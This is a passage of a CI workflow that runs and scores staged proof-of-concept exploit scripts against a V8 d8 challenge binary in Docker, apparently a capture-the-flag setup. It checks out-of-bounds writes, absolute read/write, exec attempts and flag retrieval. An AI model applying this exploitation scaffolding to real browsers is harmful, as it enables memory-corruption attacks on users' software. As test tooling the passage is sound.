                  if ((u32[1024]|0) === (0x43434343|0)) {
                    OOB_OK = 1;
                    print("[+] C5_OOB_OK");
                  }
                } catch (e) { print("[!] oob " + e); }
                safe_write(slot, old);
              }
            } catch (e) { print("[!] C5 " + e); }
            print("[*] C5_FIELD_HIT_COUNT=" + LENGTH_HIT);
            print("[*] ABS_RW_READY=" + ABS_RW_READY);
            print("[*] OOB_OK=" + OOB_OK);

            print("[*] C6_EXEC_ATTEMPT");
            print("[*] STAGE_C_SKIPPED reason=no_verified_abs_rw");
            print("[*] EXEC_ATTEMPT=0");
            print("[*] EXEC_MARKER_OK=0");
            print("[*] FLAG_VIA_EXPLOIT=0");
            print("[*] STAGE_C_END");
          })();
          """
          Path("/tmp/poc_stage_c.js").write_text(base + "\n" + probe + "\n")
          print("stage_c_bytes", Path("/tmp/poc_stage_c.js").stat().st_size)
          PY
          docker cp /tmp/poc_stage_c.js "$CONTAINER":/tmp/poc_stage_c.js 2>&1 || true
          if ! docker exec "$CONTAINER" sh -c 'test -s /tmp/poc_stage_c.js'; then
            log "base64 fallback for stage_c"
            base64 -w0 /tmp/poc_stage_c.js | docker exec -i "$CONTAINER" sh -c 'base64 -d > /tmp/poc_stage_c.js'
          fi
          IN_CT=0
          docker exec "$CONTAINER" sh -c 'test -s /tmp/poc_stage_c.js' && IN_CT=1
          echo "STAGE_C_IN_CONTAINER=$IN_CT" | tee /tmp/out/test11.result
          if [ "$IN_CT" -eq 1 ]; then
            docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors /tmp/poc_stage_c.js' > /tmp/out/test11.stdout 2> /tmp/out/test11.stderr
            RC=$?
            cat /tmp/out/test11.stdout /tmp/out/test11.stderr > /tmp/out/test11.combined
          else
            RC=98
            echo "Error: poc_stage_c.js missing in container" > /tmp/out/test11.combined
          fi
          echo "test11_rc=$RC" | tee -a /tmp/out/test11.result
          echo "===== STAGE C combined ====="
          cat /tmp/out/test11.combined
          # Score probes (informational)
          C1=0; grep -q 'WASM_EMPTY_INSTANTIATE_OK' /tmp/out/test11.combined && C1=1
          C3=0; grep -q 'C3_FUNCTION_DUMP_OK' /tmp/out/test11.combined && C3=1
          C4=0; grep -q 'C4_TYPEDARRAY_DUMP_OK' /tmp/out/test11.combined && C4=1
          SKIP=0; grep -q 'STAGE_C_SKIPPED' /tmp/out/test11.combined && SKIP=1
          EXEC=0; grep -q 'EXEC_MARKER_OK=1' /tmp/out/test11.combined && EXEC=1
          ATTEMPT=0; grep -q 'EXEC_ATTEMPT=1' /tmp/out/test11.combined && ATTEMPT=1
          C5H=$(grep -oE 'C5_FIELD_HIT_COUNT=[0-9]+' /tmp/out/test11.combined 2>/dev/null | tail -1 | cut -d= -f2)
          C5H=${C5H:-0}
          ARDY=0; grep -q 'ABS_RW_READY=1' /tmp/out/test11.combined && ARDY=1
          {
            echo "EXEC_PROBE_WASM=$C1"
            echo "EXEC_PROBE_FUNC_DUMP=$C3"
            echo "EXEC_PROBE_TA_DUMP=$C4"
            echo "C5_FIELD_HIT_COUNT=$C5H"
            echo "ABS_RW_READY=$ARDY"
            echo "EXEC_ATTEMPT=$ATTEMPT"
            echo "EXEC_MARKER_OK=$EXEC"
            echo "STAGE_C_SKIPPED=$SKIP"
          } | tee -a /tmp/out/test11.result
          log "Stage C WASM=$C1 FUNC=$C3 TA=$C4 ATTEMPT=$ATTEMPT MARKER=$EXEC SKIP=$SKIP"

          DUMP_ROOT="${GITHUB_WORKSPACE:-/tmp}/exploit-dumps"
          mkdir -p "$DUMP_ROOT/stage_c" /tmp/out/exploit-dumps/stage_c
          cp -f /tmp/out/test11.combined "$DUMP_ROOT/stage_c/test11.combined" 2>/dev/null || true
          cp -f /tmp/out/test11.result "$DUMP_ROOT/stage_c/test11.result" 2>/dev/null || true
          cp -f /tmp/poc_stage_c.js "$DUMP_ROOT/stage_c/poc_stage_c.js" 2>/dev/null || true
          awk '/STAGE_C_BEGIN/,/STAGE_C_END/' /tmp/out/test11.combined > "$DUMP_ROOT/stage_c/exec_probe_section.txt" 2>/dev/null || true
          {
            echo "# Stage C exec-surface dump"
            echo "run_id=${{ github.run_id }}"
            echo "EXEC_PROBE_WASM=$C1 FUNC=$C3 TA=$C4 ATTEMPT=$ATTEMPT MARKER=$EXEC SKIP=$SKIP"
            echo ""
            echo "## exec_probe_section"
            cat "$DUMP_ROOT/stage_c/exec_probe_section.txt" 2>/dev/null || true
          } > "$DUMP_ROOT/stage_c/README.md"
          cp -a "$DUMP_ROOT/stage_c/." /tmp/out/exploit-dumps/stage_c/ 2>/dev/null || true
          log "Wrote Stage C dumps to $DUMP_ROOT/stage_c"
          exit 0

      - name: Test 12 — Stage D flag path (real /flag or labeled sim)
        id: stage_d
        run: |
          set +e
          set -uo pipefail
          ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
          log() { echo "[$(ts)] $*"; }
          banner "TEST 12 / STAGE D — flag path (seeded for chain testing)"
          if ! docker exec "$CONTAINER" true 2>/dev/null; then docker start "$CONTAINER" 2>/dev/null || true; sleep 1; fi
          mkdir -p /tmp/out
          docker exec "$CONTAINER" sh -c 'mkdir -p /tmp /workspace; ls -lad /tmp /workspace' 2>/dev/null || true
          # Ensure seed present (idempotent if Start container already seeded)
          docker exec -e SEED_FLAG="$SEED_FLAG" "$CONTAINER" sh -c 'if [ ! -s /flag ]; then printf "%s\n" "$SEED_FLAG" > /flag; chmod 644 /flag; fi; ls -la /flag; echo -n content=; cat /flag; echo' | tee /tmp/out/test12_baseline.txt
          BASELINE_HAS=0
          if docker exec "$CONTAINER" sh -c 'test -s /flag'; then BASELINE_HAS=1; fi
          echo "BASELINE_HAS_FLAG=$BASELINE_HAS" | tee /tmp/out/test12.result
          echo "FLAG_SEEDED_FOR_CHAIN=1" | tee -a /tmp/out/test12.result
          echo "NOTE=seed_enables_chain_testing_catflag_alone_is_not_exploit" | tee -a /tmp/out/test12.result
          # Protocol check: catflag must work when /flag exists
          docker exec "$CONTAINER" sh -c 'mkdir -p /workspace; /challenge/catflag 2>&1; echo catflag_rc=$?; /challenge/catflag > /workspace/flag.txt 2>/dev/null; ls -la /workspace/flag.txt; echo -n workspace_flag=; cat /workspace/flag.txt 2>/dev/null; echo' | tee /tmp/out/test12_catflag.txt
          CATFLAG_OK=0
          if grep -q "$SEED_FLAG" /tmp/out/test12_catflag.txt 2>/dev/null; then CATFLAG_OK=1; fi
          echo "CATFLAG_SEED_OK=$CATFLAG_OK" | tee -a /tmp/out/test12.result
          # Exploit-path flag (only if d8 stdout ever printed the seed without host catflag) — reserved
          EXPLOIT_FLAG=0
          for f in /tmp/out/test10.combined /tmp/out/test11.combined /tmp/out/test4.combined; do
            if [ -f "$f" ] && grep -qF "$SEED_FLAG" "$f" 2>/dev/null; then EXPLOIT_FLAG=1; fi
          done
          echo "FLAG_VIA_EXPLOIT_STDOUT=$EXPLOIT_FLAG" | tee -a /tmp/out/test12.result
          echo "REAL_FLAG_HIT=0" | tee -a /tmp/out/test12.result
          log "Stage D seeded=$BASELINE_HAS catflag_ok=$CATFLAG_OK exploit_stdout=$EXPLOIT_FLAG (catflag alone != solve)"
          exit 0

      - name: Summary — verbose evidence gate
        if: always()
        run: |
          set +e
          set -uo pipefail
          mkdir -p /tmp/out
          ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
          log() { echo "[$(ts)] $*"; }
          dump_file() {
            local f="$1"
            if [ -f "$f" ]; then
              log "FILE $f ($(wc -c < "$f") bytes)"
              echo "----- BEGIN $f -----"
              cat "$f"
              echo "----- END $f -----"
            else
              log "FILE $f MISSING"
            fi
          }

          banner "SUMMARY"
          for i in anticheat test1 test2 test3 test4 test5; do
            echo "---- $i.result ----"
            cat /tmp/out/$i.result 2>/dev/null || echo n/a
            echo "---- $i.rc ----"
            cat /tmp/out/$i.rc 2>/dev/null || echo n/a
          done

          echo ""
          echo "===== test1 combined (tail) ====="
          tail -100 /tmp/out/test1.combined 2>/dev/null || true
          echo "===== test2 combined ====="
          cat /tmp/out/test2.combined 2>/dev/null || true
          echo "===== test4 combined ====="
          cat /tmp/out/test4.combined 2>/dev/null || true
          echo "===== test4 fault/write ====="
          dump_file /tmp/out/test4.fault
          dump_file /tmp/out/test4.write
          echo "===== test5b combined ====="
          cat /tmp/out/test5b.combined 2>/dev/null || true

          CRASH=0
          grep -qE 'ENGINE_CRASH|SIGNAL_EXIT_' /tmp/out/test1.result /tmp/out/test2.result /tmp/out/test4.result 2>/dev/null && CRASH=1

          WRITE=0
          if grep -q 'WRITE_OK=[12]' /tmp/out/test4.write 2>/dev/null; then WRITE=1; fi
          if grep -q 'WRITE_PROOF_OK' /tmp/out/test4.combined 2>/dev/null; then WRITE=1; fi
          if grep -q 'WRITE_PROOF_CONTROLLED' /tmp/out/test4.combined 2>/dev/null; then WRITE=1; fi

          MARKER=0
          if grep -q 'MARKER_OK=1' /tmp/out/test4.result 2>/dev/null; then MARKER=1; fi
          if grep -qE '42424242' /tmp/out/test2.fault /tmp/out/test4.fault /tmp/out/test2.combined /tmp/out/test4.combined 2>/dev/null; then MARKER=1; fi

          # Controlled pointer write proven by SEGV address embedding 42424242
          # (caged_write_unsafe wrote the pointer that the engine then dereferenced).
          if [ "$MARKER" -eq 1 ] && grep -qiE 'ENGINE_CRASH|SIGNAL_EXIT_' /tmp/out/test4.result 2>/dev/null; then
            log "PROOF: WRITE_VIA_FAULT - SEGV embeds 42424242 (controlled pointer write)"
            echo "WRITE_VIA_FAULT=1" | tee /tmp/out/test4.write_via_fault
            WRITE=1
          fi

          NEG=0
          grep -q 'NEG_OK' /tmp/out/test5.result 2>/dev/null && NEG=1

          AC=0
          grep -q 'ANTICHEAT_FAIL=0' /tmp/out/anticheat.result 2>/dev/null && AC=1

          log "OVERALL CRASH=$CRASH WRITE=$WRITE MARKER=$MARKER NEG=$NEG ANTICHEAT=$AC"

          {
            echo "## V8-446124892 Official PoC Test - verbose / anti-cheat"
            echo ""
            echo "- **Image**: \`$IMAGE\`"
            echo "- **Engine crash observed**: $CRASH"
            echo "- **Write primitive read-back**: $WRITE"
            echo "- **Fault marker 42424242**: $MARKER"
            echo "- **Negative controls clean**: $NEG"
            echo "- **Anti-cheat integrity**: $AC"
            echo ""
            echo "| Check | Result |"
            echo "|-------|--------|"
            echo "| Anti-cheat | $(cat /tmp/out/anticheat.result 2>/dev/null || echo n/a) |"
            echo "| Test1 harness | $(cat /tmp/out/test1.result 2>/dev/null || echo n/a) rc=$(cat /tmp/out/test1.rc 2>/dev/null) |"
            echo "| Test2 crash-only | $(cat /tmp/out/test2.result 2>/dev/null || echo n/a) rc=$(cat /tmp/out/test2.rc 2>/dev/null) |"
            echo "| Test3 env | $(cat /tmp/out/test3.result 2>/dev/null || echo n/a) |"
            echo "| Test4 write+crash | $(cat /tmp/out/test4.result 2>/dev/null || echo n/a) write=$(cat /tmp/out/test4.write 2>/dev/null) |"
            echo "| Test5 negatives | $(cat /tmp/out/test5.result 2>/dev/null || echo n/a) |"
            echo ""
            echo "### Gates"
            echo "- Crash alone is **not** enough: need write read-back **or** SEGV fault address embedding 42424242 (controlled pointer write)."
            echo "- Benign / addrof-only runs must **not** SEGV."
            echo "- PoC sha256 must match official bytes; print must be stripped on challenge d8."
          } >> "$GITHUB_STEP_SUMMARY"

          echo ""
          echo "===== test6 flag ====="
          tail -80 /tmp/out/test6.combined 2>/dev/null || true
          echo "===== test7 ext ====="
          tail -60 /tmp/out/test7.combined 2>/dev/null || true
          echo "===== test8 api ====="
          cat /tmp/out/test8.combined 2>/dev/null || true
          echo "===== test9 multi ====="
          cat /tmp/out/test9.result 2>/dev/null || true
          FLAG=0; grep -q 'FLAG_HIT=1' /tmp/out/test6.result 2>/dev/null && FLAG=1
          EXT=$(sed -n 's/EXT_SCORE=//p' /tmp/out/test7.score 2>/dev/null); EXT=${EXT:-0}
          FILEB=0; grep -q 'FILE_IO_BLOCKED=1' /tmp/out/test8.result 2>/dev/null && FILEB=1
          MULTI=$(grep -oE 'MULTI_MARKER_HITS=[0-9]+' /tmp/out/test9.result 2>/dev/null | head -1 | cut -d= -f2); MULTI=${MULTI:-0}
          LAYOUT=0; grep -q 'LAYOUT_DUMP_OK=1' /tmp/out/test10.result 2>/dev/null && LAYOUT=1
          ABS=0; grep -q 'ABS_RW_OK=1' /tmp/out/test10.result 2>/dev/null && ABS=1
          SMOKE=0; grep -q 'CAGE_SMOKE_OK=1' /tmp/out/test10.result 2>/dev/null && SMOKE=1
          B_IN=0; grep -q 'STAGE_B_IN_CONTAINER=1' /tmp/out/test10.result 2>/dev/null && B_IN=1
          EXEC=0; grep -q 'EXEC_MARKER_OK=1' /tmp/out/test11.result 2>/dev/null && EXEC=1
          SKIP=0; grep -q 'STAGE_C_SKIPPED=1' /tmp/out/test11.result 2>/dev/null && SKIP=1
          EW=0; grep -q 'EXEC_PROBE_WASM=1' /tmp/out/test11.result 2>/dev/null && EW=1
          EF=0; grep -q 'EXEC_PROBE_FUNC_DUMP=1' /tmp/out/test11.result 2>/dev/null && EF=1
          ET=0; grep -q 'EXEC_PROBE_TA_DUMP=1' /tmp/out/test11.result 2>/dev/null && ET=1
          REALF=0; grep -q 'REAL_FLAG_HIT=1' /tmp/out/test12.result 2>/dev/null && REALF=1
          SIMF=0; grep -q 'CATFLAG_PROTOCOL_SIM=1' /tmp/out/test12.result 2>/dev/null && SIMF=1
          log "EXTRA FLAG=$FLAG EXT=$EXT FILEB=$FILEB MULTI=$MULTI LAYOUT=$LAYOUT ABS=$ABS SMOKE=$SMOKE B_IN=$B_IN EXEC=$EXEC SKIP=$SKIP REALF=$REALF SIMF=$SIMF"
          {
            echo ""
            echo "### Extra tests (L1)"
            echo "- Flag/catflag hit (test6): $FLAG"
            echo "- Extended primitive score: $EXT"
            echo "- File I/O blocked (expected): $FILEB"
            echo "- Multi-marker crash hits: $MULTI"
            echo ""
            echo "### Exploitation stages"
            echo "- **L2 Stage B** script in container: $B_IN"
            echo "- **L2 Stage B** layout dump OK: $LAYOUT"
            echo "- **L2 Stage B** cage write smoke OK: $SMOKE"
            echo "- **L2 Stage B** absolute R/W OK: $ABS (requires measured offsets)"
            echo "- **L3 Stage C** exec marker OK: $EXEC / skipped: $SKIP"
            echo "- **L3 Stage C** probes WASM=$EW FUNC_DUMP=$EF TA_DUMP=$ET"
            echo "- **L4 Stage D** REAL flag via existing /flag: $REALF"
            echo "- **L4 Stage D** protocol sim only (not exploit): $SIMF"
          } >> "$GITHUB_STEP_SUMMARY"
          log "artifact tree"
          find /tmp/out -type f -exec ls -la {} \; 2>/dev/null | sort

          docker rm -f "$CONTAINER" 2>/dev/null || true

          if [ "${{ github.event.inputs.fail_without_crash }}" = "true" ]; then
            if [ "$CRASH" -eq 0 ]; then
              log "FAIL: no engine crash"
              exit 1
            fi
            if [ "$WRITE" -eq 0 ]; then
              log "FAIL: no write proof (read-back or fault-marker pointer write)"
              exit 1
            fi
            if [ "$AC" -eq 0 ]; then
              log "FAIL: anti-cheat did not pass"
              exit 1
            fi
            if [ "$NEG" -eq 0 ]; then
              log "FAIL: negative controls did not pass"
              exit 1
            fi
          fi
          log "ALL GATES PASSED"
          exit 0

      - name: Write exploit-dumps into repo tree and push
